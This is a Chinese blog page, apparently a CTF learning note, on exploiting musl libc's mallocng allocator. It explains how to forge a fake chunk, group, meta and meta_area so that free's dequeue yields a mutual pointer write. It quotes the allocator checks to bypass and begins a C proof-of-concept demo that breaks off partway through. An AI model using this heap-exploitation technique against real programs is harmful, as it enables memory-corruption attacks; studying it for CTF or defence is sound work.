<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="CoLin&#39;s Pwnhome">
<meta property="og:url" content="http://hornos3.github.com/page/5/index.html">
<meta property="og:site_name" content="CoLin&#39;s Pwnhome">
<meta property="og:locale">
<meta property="article:author" content="CoLin">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://hornos3.github.com/page/5/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh'
  };
</script>

  <title>CoLin's Pwnhome</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CoLin's Pwnhome</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-2/" class="post-title-link" itemprop="url">musl pwn 入门 (2)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-28 22:27:46 / Modified: 22:54:19" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:46+08:00">2023-02-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/musl-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">musl pwn 系列</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在上一篇文章中我们学习了musl libc中内存分配的相关知识，了解了重要的数据结构及函数内容。本文将在此基础上进一步分析musl pwn的利用方式。</p>
<p>musl libc利用的核心思想是向free中传入一个假的chunk指针。由于free函数会通过该chunk进行回溯，获取到其所在的<code>group</code>和<code>meta</code>，因此除了构造假chunk外，还需要构造假<code>group</code>和假<code>meta</code>。如果在假<code>meta</code>中合理构造<code>prev</code>和<code>next</code>指针，在<code>nontrivial_free</code>中调用<code>dequeue</code>函数就可以实现这两个地址互相写。</p>
<p>但在整个流程中，我们需要绕过很多检查，以及进入正确的分支。</p>
<p>在<code>free</code>中会调用<code>nontrivial_free</code>，<code>free</code>中调用的<code>get_meta</code>函数中有一些检查项：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">(/src/<span class="built_in">malloc</span>/mallocng/meta.h, line <span class="number">129</span>)</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert(!((<span class="type">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line">	<span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line">	<span class="type">int</span> index = get_slot_index(p);</span><br><span class="line">	<span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">		assert(!offset);</span><br><span class="line">		offset = *(<span class="type">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">		assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *)(p - UNIT*offset - UNIT);</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br><span class="line">	assert(meta-&gt;mem == base);</span><br><span class="line">	assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">	assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *)((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">	assert(area-&gt;check == ctx.secret);</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">		assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">		assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">		assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> meta *)meta;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ol>
<li>meta-&gt;mem == base，即meta中保存的group指针要正确。</li>
<li>index &lt;= meta-&gt;last_idx，即chunk的索引不能越界。</li>
<li>area-&gt;check == ctx.secret，即meta所在的meta_area的校验值正确。</li>
<li>offset &gt;= size_classes[meta-&gt;sizeclass]*index</li>
<li>offset &lt; size_classes[meta-&gt;sizeclass]*(index+1)，这两个检查offset和chunk大小是否对应。</li>
<li>assert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);，即检查offset是否越界。</li>
</ol>
<p>如果伪造的<code>meta</code>位于一个伪造的<code>meta_area</code>中，需要首先获取校验值<code>secret</code>并保存到<code>meta_area</code>开头，即这一页最开始的地方。</p>
<p>通过这个函数的检查之后，<code>nontrivial_free</code>的分支语句：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">nontrivial_free</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">	<span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">		<span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">		<span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">		<span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">			assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">			<span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">			dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">			<span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">				activate_group(ctx.active[sc]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> free_group(g);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">		assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">		<span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">		<span class="comment">// after last available slot was taken.</span></span><br><span class="line">		<span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line">			<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里要求<code>mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g)</code>，因此要合理设置<code>meta</code>的两个<code>mask</code>的值。</p>
<p>之后调用了<code>free_group</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">free_group</span><span class="params">(<span class="keyword">struct</span> meta *g)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="keyword">if</span> (sc &lt; <span class="number">48</span>) &#123;</span><br><span class="line">		ctx.usage_by_class[sc] -= g-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">		step_seq();</span><br><span class="line">		record_seq(sc);</span><br><span class="line">		mi.base = g-&gt;mem;</span><br><span class="line">		mi.len = g-&gt;maplen*<span class="number">4096UL</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="type">void</span> *p = g-&gt;mem;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> get_meta(p);</span><br><span class="line">		<span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line">		g-&gt;mem-&gt;meta = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">// not checking size/reserved here; it&#x27;s intentionally invalid</span></span><br><span class="line">		mi = nontrivial_free(m, idx);</span><br><span class="line">	&#125;</span><br><span class="line">	free_meta(g);</span><br><span class="line">	<span class="keyword">return</span> mi;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们不能在if-else语句中跳转到else分支，那样会再一次调用<code>nontrivial_free</code>，因此要保证<code>meta</code>的<code>maplen</code>字段不为0。</p>
<p>这些检查与条件判断通过后，就可以成功释放假chunk了。</p>
<p>下面就是musl libc unlink漏洞的demo程序，如有任何非预期情况请与笔者联系，不胜感激。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> last_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> freeable:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> sizeclass:<span class="number">6</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> maplen:<span class="number">8</span>*<span class="number">8</span><span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[<span class="number">0x10</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> victim_1[<span class="number">0x8</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> victim_2[<span class="number">0x8</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLACK       <span class="string">&quot;30&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED         <span class="string">&quot;31&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN       <span class="string">&quot;32&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YELLOW      <span class="string">&quot;33&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE        <span class="string">&quot;34&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PURPLE      <span class="string">&quot;35&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN_DARK  <span class="string">&quot;36&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WHITE       <span class="string">&quot;37&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDEFINED   <span class="string">&quot;-&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT   <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDERLINE   <span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPARK       <span class="string">&quot;5&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_END      <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printf_color</span><span class="params">(<span class="type">char</span>* color, <span class="type">char</span>* effect, <span class="type">char</span>* <span class="built_in">string</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, <span class="string">&quot;\033[&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(effect[<span class="number">0</span>] != <span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, effect);</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, color);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="string">&quot;m&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="built_in">string</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span> STR_END, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address info starting in %p:\n&quot;</span>, buf);</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, 